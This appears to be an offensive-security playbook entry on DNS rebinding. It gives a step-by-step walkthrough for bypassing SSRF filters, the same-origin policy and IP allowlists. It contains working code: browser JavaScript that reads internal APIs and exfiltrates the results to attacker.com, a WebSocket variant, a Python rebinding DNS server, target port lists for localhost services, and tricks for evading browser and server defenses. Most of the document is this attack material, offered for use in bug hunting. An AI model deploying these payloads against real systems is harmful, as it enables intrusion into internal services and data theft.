---
id: "dns-rebinding"
title: "DNS Rebinding Attacks"
type: "technique"
category: "web-application"
subcategory: "dns"
tags: ["dns-rebinding", "ssrf", "bypass", "ip-filter", "localhost", "same-origin", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["ssrf-techniques", "cors-misconfiguration", "metadata-ssrf"]
difficulty: "advanced"
updated: "2026-04-14"
---

# DNS Rebinding Attacks

## Why DNS Rebinding Bypasses Everything
DNS rebinding exploits the gap between DNS resolution and HTTP request. The server validates the domain's IP (safe), but by the time the actual request fires, DNS resolves to an internal IP. This bypasses SSRF filters, same-origin policy, and IP whitelists. Bounties: $5k–$30k+.

## How It Works

```
1. Attacker controls evil.com
2. evil.com DNS: First query → 1.2.3.4 (attacker's server)
3. Victim's app validates: "evil.com resolves to 1.2.3.4, not internal, OK"
4. evil.com DNS: Second query → 127.0.0.1 (or 169.254.169.254)
5. App makes the actual request to 127.0.0.1 (internal!)
6. Response comes back with internal data

Key: DNS TTL is set to 0 or 1 second
The validation lookup and the actual request get different IPs
```

## Attack Patterns

### 1. Classic SSRF Filter Bypass
```
# Target has SSRF protection that checks if URL resolves to internal IP
# Set up DNS rebinding domain:

# Using rbndr.us (public rebinding service):
# First resolution: safe IP, Second: target IP
http://7f000001.SAFE_IP_HEX.rbndr.us/path

# Using singularity of origin:
# https://github.com/nccgroup/singularity
# Automatically serves dual-resolution DNS

# Using your own DNS server:
# Configure zone file:
evil.com.  0  IN  A  ATTACKER_IP    ; First query
evil.com.  0  IN  A  127.0.0.1      ; Second query (round-robin)
```

### 2. Service Mesh / Internal API Access
```
# DNS rebind to access internal services:

# Target: Internal admin panel on localhost:8080
# 1. Create rebinding domain → 127.0.0.1
# 2. SSRF: fetch http://rebind.evil.com:8080/admin
# 3. First DNS check passes (attacker IP)
# 4. Actual fetch hits localhost:8080

# Target: Kubernetes API on 10.0.0.1:6443
# 1. Create rebinding domain → 10.0.0.1
# 2. SSRF: fetch https://rebind.evil.com:6443/api/v1/secrets

# Target: Redis on 127.0.0.1:6379
# DNS rebind to hit Redis, use HTTP-compatible commands
```

### 3. Browser-Based DNS Rebinding
```html
<!-- Attacker page loaded in victim's browser -->
<!-- evil.com initially resolves to attacker's server -->
<!-- After page loads, DNS switches to target's internal IP -->

<script>
// Wait for DNS cache to expire (1-60 seconds)
setTimeout(function() {
    // Now evil.com resolves to 127.0.0.1 or internal IP
    // Same-origin policy thinks this is still evil.com
    fetch('http://evil.com:3000/api/admin/users')
        .then(r => r.text())
        .then(data => {
            // Exfiltrate internal data
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: data
            });
        });
}, 60000); // 60 second delay for DNS TTL expiry
</script>
```

### 4. WebSocket DNS Rebinding
```javascript
// WebSocket connections are long-lived
// DNS can rebind DURING an active connection

// 1. Connect WebSocket to evil.com (resolves to attacker)
var ws = new WebSocket('ws://evil.com:8080/ws');

// 2. After connection, DNS rebinds evil.com → internal IP
// 3. Reconnect hits internal WebSocket service
// 4. Same-origin allows reading responses

ws.onclose = function() {
    // Reconnect after DNS rebind
    setTimeout(function() {
        var ws2 = new WebSocket('ws://evil.com:8080/internal-ws');
        ws2.onmessage = function(e) {
            // Internal data exfiltration
            fetch('https://attacker.com/exfil?data=' + btoa(e.data));
        };
    }, 2000);
};
```

### 5. Targeting Localhost Services
```
# Common localhost services accessible via DNS rebinding:

# Development servers:
http://rebind:3000/          # React/Node dev server
http://rebind:8080/          # Generic dev server
http://rebind:8888/          # Jupyter Notebook
http://rebind:9090/          # Prometheus
http://rebind:15672/         # RabbitMQ management
http://rebind:5601/          # Kibana
http://rebind:9200/          # Elasticsearch

# Infrastructure:
http://rebind:2375/          # Docker API (unauthenticated!)
http://rebind:2379/          # etcd
http://rebind:8500/          # Consul
http://rebind:4040/          # Spark UI

# Databases:
http://rebind:5984/          # CouchDB (has HTTP API)
http://rebind:28017/         # MongoDB HTTP interface
http://rebind:8086/          # InfluxDB HTTP API
```

## DNS Rebinding Tools

### Singularity of Origin
```bash
# Full-featured DNS rebinding attack framework
git clone https://github.com/nccgroup/singularity
cd singularity

# Start the DNS server and HTTP server:
sudo ./singularity-server -DNSRebindStrategy round-robin

# Supports:
# - Multiple rebinding strategies
# - Automatic payload generation
# - Port scanning via DNS rebinding
# - Browser-based attack interface
```

### rbndr.us
```
# Public DNS rebinding service
# Format: TARGET_HEX.SAFE_HEX.rbndr.us
# Alternates between two IPs on each query

# Example: Rebind between 1.2.3.4 and 127.0.0.1
# 1.2.3.4 in hex = 01020304
# 127.0.0.1 in hex = 7f000001
curl http://7f000001.01020304.rbndr.us/
```

### Custom DNS Server
```python
# Minimal DNS rebinding server (Python + dnslib)
from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import time

class RebindResolver(BaseResolver):
    def __init__(self):
        self.counter = {}
    
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        reply = request.reply()
        
        count = self.counter.get(qname, 0)
        self.counter[qname] = count + 1
        
        if count % 2 == 0:
            ip = "ATTACKER_IP"  # First query: safe IP
        else:
            ip = "127.0.0.1"    # Second query: target IP
        
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
        return reply

server = DNSServer(RebindResolver(), port=53, address="0.0.0.0")
server.start()
```

## Bypassing DNS Rebinding Defenses

### Browser DNS Pinning
```
# Modern browsers cache DNS for 60 seconds minimum
# Even with TTL=0, you need to wait ~60s

# Bypass: Use multiple subdomains
# a.evil.com → attacker IP (load page)
# b.evil.com → wait for cache expiry
# a.evil.com → now resolves to internal (cache expired)

# Bypass: Flood with requests to exhaust DNS cache
# Some browsers have limited cache entries
# Fill the cache with other domains to evict the target entry
```

### Server-Side Protections
```
# Protection: Double-check DNS after resolution
# Bypass: Use very short TTL (1s) and time the attack

# Protection: Block private IPs in DNS responses
# Bypass: Use IPv6 mapped addresses
#   ::ffff:127.0.0.1 may not be caught by IPv4 filters

# Protection: Use separate DNS resolution and connection
# Bypass: This is the correct defense — rare in practice
```

## Deep Dig Prompts
```
Given this URL-fetching feature [describe]:
1. Does it resolve DNS and make the request in separate steps?
2. Is there a DNS cache between validation and fetch?
3. Set up DNS rebinding with 0 TTL to internal metadata/services
4. Test browser-based rebinding for client-side features
5. Chain with: cloud metadata SSRF, Docker API access, internal admin panels
```

## Key Indicators This Will Work
- App fetches user-provided URLs server-side
- DNS validation happens separate from HTTP request
- No connection-level IP validation (only DNS-level)
- Long processing time between validation and fetch
- JavaScript-heavy features that fetch external resources
